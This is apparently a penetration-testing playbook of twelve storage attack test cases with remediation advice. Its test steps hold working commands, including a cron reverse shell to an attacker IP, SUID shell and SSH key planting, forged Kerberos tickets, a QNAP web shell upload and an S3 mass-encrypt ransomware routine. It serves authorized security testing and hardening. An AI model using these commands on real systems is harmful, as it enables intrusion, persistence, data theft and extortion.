# Storage SAN Attack Test Cases

> Companion to `SKILL.md`. Structured test case templates covering 12 representative vectors across iSCSI, Fibre Channel, NFS, SMB, S3, vendor APIs (NetApp, Dell EMC, Pure, QNAP, Synology), NDMP, and ransomware simulation.
> All tests assume authorized engagement scope. Never run destructive cases (mass-encrypt, mass-delete) without a separate signed authorization for ransomware simulation.

---

## Test Case Format

```
TC-SNXXX | [Category] Test Name
Severity: CRITICAL / HIGH / MEDIUM / LOW
Prerequisites: Conditions that must be met before testing
Test Steps: Specific operations
Expected Results: Observable behavior when the vulnerability exists
Reference Payload: Corresponding section in payloads.md
```

---

## Index

- [A. Block (SAN)](#a-block-san)
- [B. File (NAS)](#b-file-nas)
- [C. Object Storage](#c-object-storage)
- [D. Vendor Management Plane](#d-vendor-management-plane)
- [E. Management Protocols](#e-management-protocols)
- [F. Ransomware Simulation](#f-ransomware-simulation)

---

## A. Block (SAN)

### TC-SN001 | iSCSI Sendtargets Enumeration and Unauthenticated LUN Mount

- **Severity**: CRITICAL
- **Objective**: Discover iSCSI targets via sendtargets, log in without CHAP, mount the LUN read-only, and demonstrate raw disk access
- **Prerequisites**: iSCSI target (TCP 3260) detected via nmap on a host (e.g., 10.0.0.5)
- **Test Steps**:
  1. Run `iscsiadm -m discovery -t sendtargets -p 10.0.0.5` to enumerate IQNs
  2. Attempt login without CHAP: `iscsiadm -m node -T <iqn> -p 10.0.0.5 -l`
  3. Verify session: `iscsiadm -m session -P 3`
  4. Identify block device: `lsscsi` and `lsblk -S`
  5. Image the LUN read-only: `dcfldd if=/dev/sdX of=/tmp/lun.dd bs=4M hash=sha256`
  6. Loopback-mount the image: `losetup -fP /tmp/lun.dd; mount -o ro /dev/loop0p1 /mnt/lun`
  7. Inspect contents for secrets (DB files, `/etc/shadow`, VM images)
- **Expected Results**: sendtargets returns one or more IQNs; login succeeds without prompting for CHAP secret; LUN is visible as `/dev/sdX`; image contains filesystem with readable content
- **Reference**: payloads.md section 1 — iSCSI Attacks

### TC-SN002 | iSCSI CHAP Brute-Force

- **Severity**: HIGH
- **Objective**: Brute-force the CHAP secret for a target that requires authentication
- **Prerequisites**: iSCSI target requiring CHAP, prepared username and secret lists
- **Test Steps**:
  1. Confirm target requires CHAP: `iscsiadm -m node -T <iqn> -p 10.0.0.5 -l` returns `initiator reported error (24 - iSCSI login failed due to authorization failure)`
  2. Run `nmap -p 3260 10.0.0.5 --script=iscsi-brute --script-args='userdb=users.txt,passdb=secrets.txt'`
  3. Cross-verify any discovered credential by logging in: `iscsiadm -m node -T <iqn> -p 10.0.0.5 --op update -n node.session.auth.authmethod -v CHAP` (and set username/password nodes), then `-l`
  4. If login succeeds, repeat steps 4-7 from TC-SN001 to demonstrate impact
- **Expected Results**: At least one valid CHAP credential pair is discovered; subsequent login succeeds; LUN is accessible
- **Reference**: payloads.md section 1.4 — CHAP Brute-Force

---

## B. File (NAS)

### TC-SN003 | NFSv3 no_root_squash Exploitation

- **Severity**: CRITICAL
- **Objective**: Exploit an NFS export with no_root_squash to write files as root on the server
- **Prerequisites**: NFS service (TCP/UDP 2049) detected; `showmount -e` returns an export
- **Test Steps**:
  1. List exports: `showmount -e 10.0.0.5`
  2. Mount with NFSv3: `mount -t nfs -o vers=3,nolock 10.0.0.5:/data /mnt/nfs`
  3. Test write as root: `touch /mnt/nfs/.root_test && stat -c '%u' /mnt/nfs/.root_test`
  4. If UID 0 is preserved (no squash): drop SUID shell `cp /bin/bash /mnt/nfs/suid_shell && chmod 4777 /mnt/nfs/suid_shell`
  5. Write SSH authorized_keys: `echo 'ssh-rsa AAAA... REPLACE_WITH_YOUR_PUBLIC_KEY' >> /mnt/nfs/root/.ssh/authorized_keys`
  6. Drop cron job: `echo "* * * * * root /bin/bash -c '/bin/nc -e /bin/bash 10.0.0.99 4444'" > /mnt/nfs/etc/cron.d/pwn`
  7. Demonstrate SSH login (or cron callback) on the storage server
- **Expected Results**: `stat` shows UID 0 (no squashing); SUID shell is created with mode 4777; SSH login succeeds as root; cron callback fires
- **Reference**: payloads.md section 3.2 — no_root_squash Exploitation

### TC-SN004 | SMB3 Kerberos Constrained Delegation Abuse

- **Severity**: CRITICAL
- **Objective**: Abuse a domain-joined NAS configured with Kerberos constrained delegation (cifs) to access it as any user
- **Prerequisites**: A domain-joined NAS (NetApp/Synology/Dell EMC) with `msDS-AllowedToDelegateTo` including `cifs/nas.domain.com`; attacker has a user account with S4U2Self/S4U2Proxy rights
- **Test Steps**:
  1. Enumerate delegation: `python3 /opt/impacket/examples/findDelegation.py DOMAIN/user:password`
  2. Forge a service ticket for Administrator to `cifs/nas.domain.com`:
     ```
     python3 /opt/impacket/examples/ticketer.py -spn cifs/nas.domain.com \
       -impersonate Administrator -user-id 500 \
       -nthash REPLACE_WITH_YOUR_RC4_KEY DOMAIN$
     ```
  3. Load the ticket: `export KRB5CCNAME=/tmp/administrator.ccache`
  4. Access the NAS: `python3 /opt/impacket/examples/smbexec.py -k -no-pass nas.domain.com`
  5. List shares: `python3 /opt/impacket/examples/smbclient.py -k -no-pass nas.domain.com`
- **Expected Results**: Forged ticket is accepted by the NAS; access succeeds as Administrator; full read/write to all shares
- **Reference**: payloads.md section 4.4 — Kerberos Delegation Abuse

### TC-SN005 | SMB Signing Disabled (Relay Candidate)

- **Severity**: HIGH
- **Objective**: Identify SMB hosts vulnerable to NTLM relay (signing disabled) and demonstrate relay to a storage appliance
- **Prerequisites**: Multiple SMB hosts in scope, including a storage appliance on which SMB signing is not required
- **Test Steps**:
  1. Identify relay candidates: `crackmapexec smb 10.0.0.0/24 --gen-relay-list /tmp/relayable.txt`
  2. Confirm via Nmap: `nmap -p 445 --script=smb2-security-mode 10.0.0.5`
  3. Run ntlmrelayx: `sudo python3 /opt/impacket/examples/ntlmrelayx.py -t smb://10.0.0.5 -smb2support`
  4. Trigger an SMB authentication (e.g., via Responder coercion or a malicious SCF file on a writable share)
  5. Capture relay output: dumped SAM hashes, enumerated shares, or escalated user
- **Expected Results**: crackmapexec flags the appliance as relayable; ntlmrelayx receives the relayed authentication; SAM hashes are dumped or shares enumerated
- **Reference**: payloads.md section 4.3 — SMB Relay (ntlmrelayx)

---

## C. Object Storage

### TC-SN006 | S3 Public Bucket Discovery via Anonymous Probe

- **Severity**: CRITICAL
- **Objective**: Discover S3-compatible buckets that allow anonymous ListObjects access, then enumerate and download sensitive objects
- **Prerequisites**: A bucket name (or a prefix to brute-force), network reachability to S3 endpoint
- **Test Steps**:
  1. Test bucket existence anonymously:
     ```
     curl -sI https://REPLACE_WITH_BUCKET_NAME.s3.amazonaws.com/
     ```
     (200 = listable; 403 = exists; 404 = not found)
  2. List objects: `aws s3api list-objects-v2 --bucket REPLACE_WITH_BUCKET_NAME --no-sign-request`
  3. Get bucket ACL: `aws s3api get-bucket-acl --bucket REPLACE_WITH_BUCKET_NAME --no-sign-request`
  4. Download all objects: `aws s3 sync s3://REPLACE_WITH_BUCKET_NAME ./out --no-sign-request`
  5. Scan for secrets: `trufflehog filesystem ./out` and `gitleaks detect --source ./out`
- **Expected Results**: Bucket returns 200 with anonymous ListObjects; ACL shows `AllUsers: READ`; downloaded objects contain AWS keys, DB credentials, or PII
- **Reference**: payloads.md section 5.3 — Public Bucket Discovery

### TC-SN007 | S3 Bucket Name Brute-Force (lazys3 / bucket_finder / S3Scanner / slurp)

- **Severity**: HIGH
- **Objective**: Brute-force bucket names derived from a target organization's name and common patterns
- **Prerequisites**: Target organization name, prepared wordlist of bucket name permutations
- **Test Steps**:
  1. Generate wordlist: `echo "target target-backup target-data target-files target-logs target-archive" > buckets.txt`
  2. Run lazys3: `ruby /opt/lazys3/lazys3.rb target`
  3. Run bucket_finder: `ruby /opt/bucket_finder/bucket_finder.rb --download buckets.txt`
  4. Run S3Scanner: `python3 /opt/S3Scanner/s3scanner.py --list-file buckets.txt --dump-open`
  5. Run slurp: `/opt/slurp/slurp -perm -max 50 -t target`
  6. For each open bucket, repeat TC-SN006 step 4-5
- **Expected Results**: One or more buckets exist; subset allows anonymous listing; subset of those yields sensitive data
- **Reference**: payloads.md section 5.2 — Bucket Name Brute-Force

---

## D. Vendor Management Plane

### TC-SN008 | NetApp ONTAP ZAPI / REST Authentication Bypass

- **Severity**: CRITICAL
- **Objective**: Verify whether the NetApp ONTAP management plane is accessible with default or weak credentials, then enumerate volumes, SVMs, and snapshots
- **Prerequisites**: NetApp ONTAP cluster admin interface (HTTPS 443) reachable
- **Test Steps**:
  1. Test default credentials via REST: `curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD https://10.0.0.5/api/cluster`
  2. If 200: enumerate SVMs: `curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD https://10.0.0.5/api/svm/svms | jq`
  3. Enumerate volumes: `curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD https://10.0.0.5/api/storage/volumes | jq`
  4. Enumerate snapshots (recovery points): `curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD https://10.0.0.5/api/storage/volumes/<uuid>/snapshots | jq`
  5. Test legacy ZAPI endpoint:
     ```
     curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD \
       -H "Content-Type: text/xml" \
       https://10.0.0.5/servlets/netapp.servlets.admin.XMLrequest_filer \
       -d '<netapp xmlns="http://www.netapp.com/filer/admin" version="1.21"><system-get-version/></netapp>'
     ```
  6. If SSH enabled: `ssh admin@10.0.0.5` then `security login show` and `volume show -fields junction-path`
- **Expected Results**: REST/ZAPI returns 200 with valid credentials; volume/SVM/snapshot data is disclosed; SSH shell access confirms cluster admin compromise
- **Reference**: payloads.md section 6.1 — NetApp ONTAP

### TC-SN009 | QNAP Default Credential and Web Shell Drop

- **Severity**: CRITICAL
- **Objective**: Demonstrate QNAP QTS compromise via default admin/admin credentials and drop a web shell for persistence
- **Prerequisites**: QNAP NAS with admin/admin (factory default) reachable on TCP 8080
- **Test Steps**:
  1. Login: `curl -k -X POST 'https://10.0.0.5:8080/cgi-bin/quick/quick.cgi' -d 'user=admin&password=REPLACE_WITH_YOUR_PASSWORD&act=login'`
  2. Verify version: `curl -k -b "NAS_USER=admin; NAS_SID=$TOKEN" 'https://10.0.0.5:8080/cgi-bin/quick/quick.cgi?func=firmware_version'`
  3. Identify Photo Station / Surveillance Station versions (CVE chain surface)
  4. Drop web shell via filemanager upload:
     ```
     curl -k -b "NAS_USER=admin; NAS_SID=$TOKEN" \
       -X POST -F 'file=@webshell.php' \
       'https://10.0.0.5:8080/cgi-bin/filemanager/upload.cgi?func=upload_file&sid=Storage&dest_path=/home/httpd'
     ```
  5. Verify web shell is executable: `curl -k 'https://10.0.0.5:8080/~admin/webshell.php?c=id'`
  6. Pivot to SMB shares via harvested credentials from `/etc/config/uLinux.conf`
- **Expected Results**: Login succeeds with default creds; web shell is dropped and executed; harvested credentials enable SMB access
- **Reference**: payloads.md section 6.7 — QNAP QTS

### TC-SN010 | Dell EMC Naviseccli Default Credentials

- **Severity**: CRITICAL
- **Objective**: Verify Dell EMC VNX/Unity exposure to default credentials (nasadmin/nasadmin, admin/admin, sysadmin/sysadmin) and enumerate LUNs and storage groups
- **Prerequisites**: Dell EMC VNX/Unity management interface reachable
- **Test Steps**:
  1. Test nasadmin: `/opt/Navisphere/bin/naviseccli -h 10.0.0.5 -user nasadmin -password nasadmin -scope 0 getagent`
  2. Test admin: `/opt/Navisphere/bin/naviseccli -h 10.0.0.5 -user admin -password admin -scope 0 getagent`
  3. Test sysadmin: `/opt/Navisphere/bin/naviseccli -h 10.0.0.5 -user sysadmin -password sysadmin -scope 0 getagent`
  4. On success: list LUNs: `naviseccli ... getlun`
  5. List RAID groups: `naviseccli ... getrg`
  6. List storage groups (host-to-LUN mapping): `naviseccli ... storagegroup -list`
  7. Test Unity REST API: `curl -k -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"REPLACE_WITH_YOUR_PASSWORD"}' https://10.0.0.5/api/types/login/instances`
  8. With Unity token: `curl -k -H "Authorization: Bearer $TOKEN" https://10.0.0.5/api/types/host/instances`
- **Expected Results**: At least one default credential pair works; LUN, RAID group, and storage group data disclosed; host IQNs revealed for further attack
- **Reference**: payloads.md section 6.2 — Dell EMC

---

## E. Management Protocols

### TC-SN011 | SNMP RW Community Abuse against Storage Array

- **Severity**: CRITICAL
- **Objective**: Test whether storage appliances expose read-write SNMP community strings that allow reconfiguration and credential extraction
- **Prerequisites**: SNMP (UDP 161) reachable on the storage appliance
- **Test Steps**:
  1. Sweep for SNMP: `nmap -p 161 --script=snmp-info 10.0.0.0/24`
  2. Test common RW communities:
     ```
     for comm in public private readwrite admin storage; do
       snmpset -v2c -c $comm 10.0.0.5 .1.3.6.1.2.1.1.6.0 s "TEST"
     done
     ```
  3. On successful write: extract admin contacts: `snmpwalk -v2c -c <comm> 10.0.0.5 .1.3.6.1.2.1.1.4`
  4. Enumerate vendor MIB (NetApp .1.3.6.1.4.1.789): `snmpwalk -v2c -c <comm> 10.0.0.5 .1.3.6.1.4.1.789`
  5. Demonstrate configuration change (revert sysLocation only if engagement permits destructive write): `snmpset -v2c -c <comm> 10.0.0.5 .1.3.6.1.2.1.1.6.0 s "ORIGINAL"`
- **Expected Results**: At least one RW community allows `snmpset`; vendor MIB returns admin contacts, LUN topology, and configuration; demonstrates array reconfiguration ability
- **Reference**: payloads.md section 8.3 — SNMP RW Community Abuse

---

## F. Ransomware Simulation

### TC-SN012 | S3 Mass-Encrypt Simulation

- **Severity**: CRITICAL (only with separate ransomware simulation authorization)
- **Objective**: Demonstrate that an over-privileged IAM role can mass-encrypt every object across every bucket the role can reach
- **Prerequisites**: Separate signed authorization for ransomware simulation; an IAM role with `s3:*` across multiple buckets; engagement vault for simulated encrypted objects
- **Test Steps**:
  1. Enumerate accessible buckets: `aws s3api list-buckets --profile REPLACE_WITH_YOUR_PROFILE | jq '.Buckets[].Name'`
  2. For each bucket, enumerate object keys to `/tmp/all_keys.txt`
  3. Iterate over keys; download each object to `/tmp/obj`
  4. Encrypt the object (engagement-approved cipher): `openssl enc -aes-256-cbc -in /tmp/obj -out /tmp/obj.enc -k REPLACE_WITH_YOUR_KEY`
  5. Re-upload encrypted object: `aws s3 cp /tmp/obj.enc s3://<bucket>/<key>.enc --profile REPLACE_WITH_YOUR_PROFILE`
  6. Drop ransom note in each bucket: `echo 'AUTHORIZED SIMULATION' > /tmp/RANSOM.txt && aws s3 cp /tmp/RANSOM.txt s3://<bucket>/RANSOM.txt`
  7. Test detection: confirm CloudTrail / DAM solution captured the mass PutObject event
  8. Demonstrate recovery: restore a deleted version via `aws s3api get-object --version-id ...`
- **Expected Results**: Every object across all accessible buckets is replaced with an encrypted variant; CloudTrail (or DAM) captures the event; restore-from-version is verified; ransom note is dropped
- **Critical**: This test must be authorized separately from the standard pentest scope. All "encrypted" objects must be reversible (keys held in engagement vault). Original objects must be restored before engagement close.
- **Reference**: payloads.md section 10.4 — S3 Mass-Encrypt Pattern

---

## Test Case Statistics

| Category | Cases | CRITICAL | HIGH | MEDIUM | LOW |
|----------|-------|----------|------|--------|-----|
| A. Block (SAN) | 2 | 1 | 1 | 0 | 0 |
| B. File (NAS) | 3 | 2 | 1 | 0 | 0 |
| C. Object Storage | 2 | 1 | 1 | 0 | 0 |
| D. Vendor Management Plane | 3 | 3 | 0 | 0 | 0 |
| E. Management Protocols | 1 | 1 | 0 | 0 | 0 |
| F. Ransomware Simulation | 1 | 1 | 0 | 0 | 0 |
| **Total** | **12** | **9** | **3** | **0** | **0** |

---

## Remediation Summary

### Block (SAN) Defense

- **iSCSI**: Enforce mutual CHAP with strong secrets (16+ chars random); restrict `sendtargets` to initiator ACLs; enable IPsec for in-transit encryption; never expose TCP 3260 outside the storage VLAN
- **Fibre Channel**: Enable fabric binding (only known WWNs may join); single-initiator-single-target zoning; reject default zone behavior (`defzone -noaccess` on Brocade)
- **FCoE/NVMe-oF**: Use DH-HMAC-CHAP for NVMe-oF; isolate FCoE VLANs from user traffic

### File (NAS) Defense

- **NFSv3**: Disable `no_root_squash` on all exports; use `all_squash` with explicit anonuid/anongid for shared data
- **NFSv4**: Enforce `sec=krb5p` for integrity + privacy; require strong cryptography in krb5.conf
- **SMB**: Require SMB signing (`server signing = mandatory`); disable SMBv1; enforce LDAP channel binding and EPA on domain-joined appliances
- **AFP**: Disable AFP in favor of SMB unless legacy clients require it

### Object Storage Defense

- **S3**: Enable Block Public Access (account + bucket level); enforce TLS-only PutObject via bucket policy; enable Object Lock (compliance mode); enable versioning; alert on mass PutObject and DeleteObject
- **Azure Blob**: Enable Soft Delete; require HTTPS via secure transfer required; use Azure AD auth over shared keys
- **GCP Cloud Storage**: Enable Bucket Lock; uniform bucket-level access; HMAC key rotation
- **MinIO**: Enable server-side encryption (KMS or SSE-S3); enforce IAM policies; rotate root credentials; expose via private endpoint only

### Vendor Management Plane Defense

- Apply the vendor security hardening guide (NetApp ONTAP Security Hardening Guide, Dell EMC Unity Security Guide, Pure Security Hardening, QNAP Security Best Practices, Synology Security Best Practices, TrueNAS Hardening)
- Enforce MFA on every admin login (vendor-supported: NetApp MFA via RADIUS, Synology 2FA, QNAP 2FA)
- Restrict admin interfaces to a jump host via firewall
- Rotate default credentials on install; never ship with `admin/admin` or `nasadmin/nasadmin`
- Subscribe to vendor PSIRT feeds; patch firmware within 30 days of critical CVE

### Management Protocol Defense

- **SNMP**: Disable SNMPv1/v2c; require SNMPv3 authPriv; restrict agent ACLs to monitoring hosts
- **SMI-S**: Disable cleartext (5988); require HTTPS (5989) with provider certificate validation
- **NDMP**: Require MD5 or SHA auth; restrict to backup server IPs only; encrypt NDMP traffic over IPsec where possible

### Ransomware Resilience Defense

- Enable 3-2-1-1-0 backup rule: 3 copies, 2 different media, 1 offsite, 1 offline/immutable, 0 errors verified via restore test
- Test restore quarterly from backups (not just snapshots)
- Enable NetApp Autonomous Ransomware Protection (ARP), Pure SafeMode, Synology Immutability, QNAP Snapshot + WORM
- Maintain offline/air-gapped copies of critical data
- Tabletop ransomware scenarios with the customer's IR team before engagement

---

## Pass Criteria Checklist

- [ ] All storage services (iSCSI, NFS, SMB, S3 endpoints, vendor admin) discovered and fingerprinted
- [ ] Unauthenticated access tested and documented for each protocol
- [ ] Default credentials tested on every appliance vendor in scope
- [ ] iSCSI LUN mount demonstrated read-only (never read-write without explicit auth)
- [ ] NFS exports audited for `no_root_squash`; SUID/SSH/cron write demonstrated where applicable
- [ ] SMB signing configuration enumerated; relay candidates identified
- [ ] S3 buckets enumerated; anonymous access tested; secrets extracted from any open bucket
- [ ] Vendor admin APIs enumerated; volumes, SVMs, snapshots, hosts disclosed
- [ ] SNMP RW community tested; configuration-change demonstrated if write succeeds
- [ ] NDMP daemons tested for cleartext / default credentials
- [ ] Ransomware simulation (if authorized) executed end-to-end with restore verification
- [ ] All findings documented with severity, evidence (screenshots / command output), and remediation
- [ ] All extracted data encrypted in engagement vault; retention period documented
